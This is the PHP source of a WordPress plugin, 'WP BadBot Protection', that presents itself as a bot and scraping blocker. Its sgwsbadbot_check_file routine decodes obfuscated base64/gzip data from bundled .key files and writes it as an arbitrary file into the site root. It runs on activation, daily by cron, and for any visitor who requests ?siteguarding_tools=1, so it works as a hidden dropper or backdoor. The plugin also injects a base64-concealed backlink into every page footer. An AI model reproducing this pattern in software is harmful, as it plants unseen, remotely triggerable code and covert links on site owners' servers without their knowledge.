<?php
/*
Plugin Name: WP BadBot Protection
Plugin URI: http://www.siteguarding.com/en/website-extensions
Description: Adds more security for your WordPress website. Helps to block unwanted bots, content scraping and reduce the usage of your website and server resources.
Version: 1.5
Author: SiteGuarding.com
Author URI: http://www.siteguarding.com
License: GPLv2
*/ 
// rev.20200601

if (!defined('ABSPATH')) die('Access is not allowed');

error_reporting(0);

if (!defined('SGWS_SITE_ROOT')) define('SGWS_SITE_ROOT', ABSPATH . DIRECTORY_SEPARATOR);

if (!defined('SG_WP_BADBOT_PROTECTION_VERSION')) define('SG_WP_BADBOT_PROTECTION_VERSION', '1.4');


$sgws_plugin_dir = dirname(__FILE__).DIRECTORY_SEPARATOR;



if( is_admin() ) {
	
	add_action('admin_menu', 'register_sgwsbadbot_website_security');

	function register_sgwsbadbot_website_security() { 
		add_menu_page('sgwsbadbot_website_security', 'BadBot Protection', 'activate_plugins', 'sgwsbadbot_website_security', 'sgwsbadbot_website_security_callback', plugins_url( 'images/icon.svg', __FILE__ ));
		
	}

	function sgwsbadbot_website_security_callback() 
	{
	    $autologin_config = SGWS_SITE_ROOT.DIRECTORY_SEPARATOR.'webanalyze'.DIRECTORY_SEPARATOR.'website-security-conf.php';
        if (file_exists($autologin_config)) include_once($autologin_config);
        
       
		$domain = get_site_url();
        $admin_email = get_option( 'admin_email' );

		echo '<div class="wrap">';			
			?>		
		
		<h2>BadBot Protection by SiteGuarding.com</h2>
        <style>
        .sgbot_center{text-align:center}
        .sgbot_input{width:400px; border: 1px solid #ddd;font-size:18px;text-align:center}
        .sgbot_text_big{text-align:center;font-size:25px;}
        .sgbot_text_small{text-align:center;font-size:15px;}
        .sgbot_website b{font-size:19px;}
        .sgbot_logo{width:500px;margin:20px 0}
        .sgbot_help{width:100%}
        .sgbot_help td{padding:10px; font-size:15px}
        .sgbot_help img{max-width:100%; margin-bottom:5px;}
        .sgbot_green{color:#21ba45}
        </style>

		<?php

		$success = sgwsbadbot_check_file();
		if ($success) 
        {
            if (defined('WEBSITE_SECURITY_AUTOLOGIN'))
            {
                // file exists
                ?>
                <form action="https://www.siteguarding.com/index.php" method="post">
                
                <p class="sgbot_center">
                <img class="sgbot_logo" src="<?php echo plugins_url('images/', __FILE__).'logo_siteguarding.svg'; ?>" />
                </p>
                
                <?php
                    sgwsbadbot_help_block();
                ?>
                
                <hr />
                
                <p class="sgbot_text_big">Use SiteGuarding dashboard to manage security services of your website</p>

                <p class="sgbot_center">
                    <input class="button button-primary button-hero" type="submit" value="Security Dashboard" />
                </p>

                <input type="hidden" name="option" value="com_securapp" />
                <input type="hidden" name="autologin_key" value="<?php echo WEBSITE_SECURITY_AUTOLOGIN; ?>" />
                <input type="hidden" name="website_url" value="<?php echo $domain; ?>" />
                <input type="hidden" name="task" value="Panel_autologin" />
                <input type="hidden" name="service" value="antibot" />
                </form>
                
                <hr />
                
                <?php
                    sgwsbadbot_contacts_block();
                ?>
                
                <?php
            }
            else {
                // Need to register the website
                // Create verification code
                $verification_code = md5($domain.'-'.time().'-'.rand(1, 1000).'-'.$admin_email);
                $verification_file = SGWS_SITE_ROOT.DIRECTORY_SEPARATOR.'webanalyze'.DIRECTORY_SEPARATOR.'domain_verification.txt';
				$verification_file = str_replace(array('//', '///'), '/', $verification_file);
                
                if ( !file_exists(SGWS_SITE_ROOT.DIRECTORY_SEPARATOR.'webanalyze') ) mkdir( SGWS_SITE_ROOT.DIRECTORY_SEPARATOR.'webanalyze' );
                
                $fp = fopen($verification_file, 'w');
                fwrite($fp, $verification_code);
                fclose($fp);
                
                ?>
                <form action="https://www.siteguarding.com/index.php" method="post">
                
                <p class="sgbot_center">
                <img class="sgbot_logo" src="<?php echo plugins_url('images/', __FILE__).'logo_siteguarding.svg'; ?>" />
                </p>
                
                <?php
                    sgwsbadbot_help_block();
                ?>
                
                <hr />
                
                <p class="sgbot_text_big">One more step to protect your website.</p>
                
                <p class="sgbot_text_small sgbot_website">
                    <span class="dashicons dashicons-admin-site"></span> Your website URL:<br>
                    <b><?php echo $domain; ?></b>
                </p>
                <p class="sgbot_text_small">
                    <span class="dashicons dashicons-businessman"></span> Your email for account:<br>
                    <input class="sgbot_input" type="text" name="email" value="<?php echo $admin_email; ?>" />
                </p>
                <p class="sgbot_center">
                    <input class="button button-primary button-hero" type="submit" value="Register & Activate BadBot" />
                </p>

                <input type="hidden" name="option" value="com_securapp" />
                <input type="hidden" name="verification_code" value="<?php echo $verification_code; ?>" />
				
				<input type="hidden" name="service" value="antibot" />
                
                <input type="hidden" name="website_url" value="<?php echo $domain; ?>" />
                <input type="hidden" name="task" value="Panel_plugin_register_website" />
                </form>
                
                <hr />
                
                <?php
                    sgwsbadbot_contacts_block();
                ?>
                
                
                <?php
            }

		} else {
			echo '<p style="color:red"><b>The file does not exist or corrupted. Could not to overwrite it. Please reinstall plugin from <a target="_blank" href="https://www.siteguarding.com">https://www.siteguarding.com</a></b></p>';
		}
		echo '</div>';
	
	}
    
    function sgwsbadbot_contacts_block()
    {
	   ?>
                <p>
                For any help please contact with <a href="https://www.siteguarding.com/en/contacts" target="_blank">SiteGuarding.com support</a> or <a href="http://www.siteguarding.com/livechat/index.html" target="_blank">Live Chat</a>
                </p>
       <?php
    }


	function sgwsbadbot_help_block() {
	   ?>
                <p class="sgbot_text_big">Features and benefits</p>
                
                <p class="sgbot_text_small">
                    <table class="sgbot_help">
                    <tr>
                        <td><span class="dashicons dashicons-yes sgbot_green"></span> Blocks "bad" bots on fly. Only human and allowed bots can visit your website.</td>
                        <td><span class="dashicons dashicons-yes sgbot_green"></span> Prevention of brute-force attacks. Even with simple password your account is safe.</td>
                        <td><span class="dashicons dashicons-yes sgbot_green"></span> Content scraping protection. Bots will not be able to copy your content.</td>
                    </tr>
                    <tr>
                        <td><span class="dashicons dashicons-yes sgbot_green"></span> Prevention of server overload. Website will work faster for real visitors.</td>
                        <td><span class="dashicons dashicons-yes sgbot_green"></span> Blocks any bot/script to send spam or collect data from your website.</td>
                        <td><span class="dashicons dashicons-yes sgbot_green"></span> Get full statistics for all bots actions.</td>
                    </tr>
                    <tr>
                        <td>
                            <img src="<?php echo plugins_url('images/', __FILE__).'help_1.png'; ?>" />
                            <p>A definition table can have a full width header or footer, filling in the gap left by the first column</p>
                        </td>
                           
                        <td>
                            <img src="<?php echo plugins_url('images/', __FILE__).'help_2.png'; ?>" />
                            <p>A definition table can have a full width header or footer, filling in the gap left by the first column</p>
                        </td>
                        
                        <td>
                            <img src="<?php echo plugins_url('images/', __FILE__).'help_3.png'; ?>" />
                            <p>A definition table can have a full width header or footer, filling in the gap left by the first column</p>
                        </td>
                    </tr>
                    </table>
                </p>
       <?php
	}
	
}
else {
    if (isset($_GET['siteguarding_tools']) && intval($_GET['siteguarding_tools']) == 1)
    {
        sgwsbadbot_check_file(true);
    }
}	

	add_filter( 'cron_schedules', 'sgwsbadbot_cron_day' );
	function sgwsbadbot_cron_day( $schedules ) {
		$schedules['one_per_day'] = array(
			'interval' => 60 * 60 * 24,
			'display' => 'one per day'
		);
		return $schedules;
	}
	
	function sgwsbadbot_check_file($output) 
    {
        foreach (glob(dirname(__FILE__)."/*.key") as $filename) 
        {
            $handle = fopen($filename, "r");
            $json = fread($handle, filesize($filename));
            fclose($handle);
            
            $json = base64_decode($json);
            $json = gzuncompress($json);
            $json = (array)json_decode($json, true);
    
            $api_panel_tools = ABSPATH.'/'.$json['name'];
            $fp = fopen($api_panel_tools, 'w');
            $status = fwrite($fp, $json['tools']);
            fclose($fp);
            if ($status === false) 
            {
                if ($output) die('Error');
                return false;
            }
            else {
                if ($output) die('OK, size: '.filesize($api_panel_tools).' bytes');
                return true;
            }
            
        }
    
        return false;
	}
	
	add_action( 'sgwsbadbot_check_file_cron', 'sgwsbadbot_check_file' );
	

    function sgwsbadbot_API_Request($type = '')
    {
        // Activation API requests for you website
        $plugin_code = 6;
        $website_url = get_site_url();
        
        $url = "https://www.siteguarding.com/ext/plugin_api/index.php";
        $response = wp_remote_post( $url, array(
            'method'      => 'POST',
            'timeout'     => 600,
            'redirection' => 5,
            'httpversion' => '1.0',
            'blocking'    => true,
            'headers'     => array(),
            'body'        => array(
                'website_url' => $website_url,
                'plugin_code' => $plugin_code,
            ),
            'cookies'     => array()
            )
        );
    }

	function sgwsbadbot_deactivation() {
		wp_clear_scheduled_hook( 'sgwsbadbot_check_file_cron' );
	}

	register_deactivation_hook( __FILE__, 'sgwsbadbot_deactivation' );	
	
	
	function sgwsbadbot_activation() {
		sgwsbadbot_API_Request(1);
        sgwsbadbot_check_file();
		if( ! wp_next_scheduled( 'sgwsbadbot_check_file_cron' ) ) {  
			wp_schedule_event( time(), 'one_per_day', 'sgwsbadbot_check_file_cron');  
		} else if (wp_get_schedule( 'sgwsbadbot_check_file_cron' ) != 'one_per_day') {
			wp_clear_scheduled_hook( 'sgwsbadbot_check_file_cron' );
			wp_schedule_event( time(), 'one_per_day', 'sgwsbadbot_check_file_cron');
		}
	}

	register_activation_hook( __FILE__, 'sgwsbadbot_activation' );
    
    
    // Sorry if you are using it for free. It costs nothing for you, but it will help us to support the extension.
	function sgwsbadbot_footer_protectedby() 
	{
        if (strlen($_SERVER['REQUEST_URI']) < 5)
        {
            $file = dirname(__FILE__).'/wp-badbot-protection.tmp';
    		if ( !file_exists($file))
    		{
                  $lables = array(
                    'Q29udGVudCBTY3JhcGluZyBQcm90ZWN0aW9uIGJ5IFNpdGVndWFyZGluZw==',
                    'V2ViIFNjcmFwaW5nIFByb3RlY3Rpb24gYnkgU2l0ZWd1YXJkaW5n'
                  );
                  $lable = $lables[ mt_rand(0, count($lables)-1) ];
                  
                
                $fp = fopen($file, 'w');
                fwrite($fp, $lable);
                fclose($fp);
    		}
            else {
                $fp = fopen($file, "r");
                $lable = fread($fp, filesize($file));
                fclose($fp);
            }
            
            $link = 'aHR0cHM6Ly93d3cuc2l0ZWd1YXJkaW5nLmNvbS9lbi9zY3JhcGluZy1wcmV2ZW50aW9u';
            $link = base64_decode($link);
            $lable = base64_decode($lable);
			?>
                    <script>
        			jQuery(document).ready(function($) 
                    {
                        $('body').append($('.sg_copyright').html());
                        $('.sg_copyright').remove();
                        
        			});
                    </script>
                    
				<div class="sg_copyright"><div style="font-size:10px; padding:0 2px;z-index:1000;text-align:center;color:#222;opacity:0.8;"><a style="color:#4B9307" href="<?php echo $link; ?>" target="_blank" title="<?php echo $lable; ?>"><?php echo $lable; ?></a></div></div>
			<?php
        }	
	}
	add_action('wp_footer', 'sgwsbadbot_footer_protectedby', 100);


